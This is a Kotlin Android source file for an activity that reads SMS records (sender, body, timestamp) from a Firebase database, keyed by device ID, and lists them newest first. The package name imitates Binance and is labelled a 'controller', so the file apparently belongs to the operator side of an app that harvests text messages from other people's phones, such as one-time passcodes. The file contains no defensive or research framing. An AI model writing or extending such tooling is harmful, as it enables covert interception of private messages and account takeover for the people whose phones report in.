package dApp.binance.Trading.controller

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class SmsLogsActivity : AppCompatActivity() {

    private lateinit var smsRecyclerView: RecyclerView
    private val smsList = mutableListOf<SmsMessage>()
    private var deviceId: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_sms_logs)

        deviceId = intent.getStringExtra("device_id") ?: ""
        smsRecyclerView = findViewById(R.id.smsRecyclerView)
        smsRecyclerView.layoutManager = LinearLayoutManager(this)

        listenForSms()
    }

    private fun listenForSms() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("sms").child(deviceId).addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                smsList.clear()
                snapshot.children.forEach { child ->
                    val data = child.value as? Map<*, *>
                    if (data != null) {
                        smsList.add(SmsMessage(
                            sender = data["sender"]?.toString() ?: "Unknown",
                            body = data["body"]?.toString() ?: "",
                            timestamp = (data["timestamp"] as? Long) ?: 0L
                        ))
                    }
                }
                // Sort newest on top
                smsList.sortByDescending { it.timestamp }
                smsRecyclerView.adapter = SmsAdapter(smsList)
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })
    }
}

data class SmsMessage(
    val sender: String,
    val body: String,
    val timestamp: Long
)

class SmsAdapter(private val messages: List<SmsMessage>) : RecyclerView.Adapter<SmsViewHolder>() {
    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): SmsViewHolder {
        val view = LayoutInflater.from(parent.context).inflate(R.layout.item_sms, parent, false)
        return SmsViewHolder(view)
    }
    override fun onBindViewHolder(holder: SmsViewHolder, position: Int) = holder.bind(messages[position])
    override fun getItemCount() = messages.size
}

class SmsViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
    fun bind(msg: SmsMessage) {
        itemView.findViewById<TextView>(R.id.smsSender).text = msg.sender
        itemView.findViewById<TextView>(R.id.smsBody).text = msg.body
        
        val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
        itemView.findViewById<TextView>(R.id.smsTime).text = sdf.format(Date(msg.timestamp))
    }
}
